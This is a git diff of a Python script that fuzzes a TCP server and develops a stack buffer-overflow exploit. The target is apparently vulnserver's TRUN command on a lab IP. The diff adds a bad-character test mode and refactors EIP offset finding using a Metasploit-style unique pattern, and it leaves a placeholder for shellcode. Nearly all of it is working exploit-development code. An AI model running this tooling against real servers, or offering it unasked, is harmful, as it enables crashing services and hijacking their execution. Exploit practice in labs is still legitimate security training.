@@ -1,13 +1,17 @@
 '''
-A dumb buffer overflow script that fuzzes target server.
-I've also integrated `metasploit-framework/tools/exploit/pattern_create.rb -l & -q` into this
+A dumb buffer overflow script that fuzzes target server:
+- Integrated `metasploit-framework/tools/exploit/pattern_create.rb -l & -q` for offset finding
+- Bad character testing
 
 Usage:
 - Fuzz:
     python .\main.py --target 192.168.217.133 --port 9999 --command "TRUN /.:/"  --mode fuzz
 
-- Offset + EIP interpretation:
-    python .\main.py --target 192.168.217.133 --port 9999 --prefix "TRUN /.:/"  --mode offset --length 2400
+- Offset + EIP:
+    python .\main.py --target 192.168.217.133 --port 9999 --prefix "TRUN /.:/"  --mode offset --olength 2400
+
+- Bad Character Tests:
+    python .\main.py --target 192.168.217.133 --port 9999 --prefix "TRUN /.:/"  --mode badchar --blength 2003
 '''
 
 import argparse
@@ -37,12 +41,21 @@ def fuzz(target: str, port: int, expect_resp: bool, stride: int, command_prefix:
 
 
 # Send a chunk of unique pattern'd data to target server
-def send_chunk(target: str, port: int, command_prefix: str, sequence: str):
+def send_chunk(target: str, port: int, command_prefix: str, sequence: str, send_raw: bool = False):
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
         sock.connect((target, port))
         print("send %s bytes" % len(sequence))
-        sock.send((command_prefix + sequence).encode("utf-8"))
+        # Bad Character needs to be sent raw, otherwise there will be C0 characters
+        # However, other payloads need to be encoded to utf-8 otherwise EIP value will be wrong
+        # This might have something to do with Little Endian
+        if send_raw:
+            sock.send(bytes(command_prefix + sequence, "raw_unicode_escape"))
+        else:
+            sock.send((command_prefix + sequence).encode("utf-8"))
         print("sent")
+
+
+def find_offset(sequence: str) -> int:
     le_hex = input("Enter EIP value:")
     # since windows uses little endian, the value is reversed
     #   e.g. 386F4337 => 8oC7 => 7Co8
@@ -77,7 +90,7 @@ parser = argparse.ArgumentParser(description="Dumb fuzzing tool")
 
 # -- Mode --
 parser.add_argument("--mode", type=str,
-                    help="[required] attack mode: fuzz|offset")
+                    help="[required] attack mode: fuzz|offset|badchar")
 # -- Target --
 parser.add_argument("--target", type=str, help="[required] target server")
 parser.add_argument("--port", type=int, help="[required] target port")
@@ -92,22 +105,39 @@ parser.add_argument("--prefix", type=str,
 parser.add_argument("--stride", type=int,
                     help="[optional] number in bytes to increment for each fuzzing iteration. default 100", default=100)
 # -- Offset --
-parser.add_argument("--length", type=int,
+parser.add_argument("--olength", type=int,
                     help="[optional] unique pattern of strings at given length to be sent. default 2000", default=2000)
 
+# -- Bad Character --
+# FIXME: Make arguments required conditionally
+parser.add_argument("--blength", type=int,
+                    help="[optinoal] offset right before EIP location, used for testing bad characters", default=0)
 
+# -- Shellcode --
+
+
+# Main Program
 args = parser.parse_args()
 
 mode = args.mode.lower()
+
 if mode == "fuzz":
     len_crash_bytes = fuzz(args.target, args.port,
                            args.resp, args.stride, args.prefix, args.timeout)
     print("Program crashed at %s bytes", len_crash_bytes)
 
 elif mode == "offset":
-    seq = generate_unique_pattern(args.length)
-    offset = send_chunk(args.target, args.port, args.prefix, seq)
+    seq = generate_unique_pattern(args.olength)
+    send_chunk(args.target, args.port, args.prefix, seq)
+    offset = find_offset(seq)
     print("offset is at", offset)
+
+elif mode == "badchar":
+    # Generate 0x01 to 0xff into a string
+    badchars = "".join([chr(h) for h in range(1, 256)])
+    payload = args.blength * "A" + "B" * 4 + badchars
+    print("sending bad character test payload:", payload)
+    send_chunk(args.target, args.port, args.prefix, payload, True)
 
 else:
     print("[ERROR] attack mode invalid")
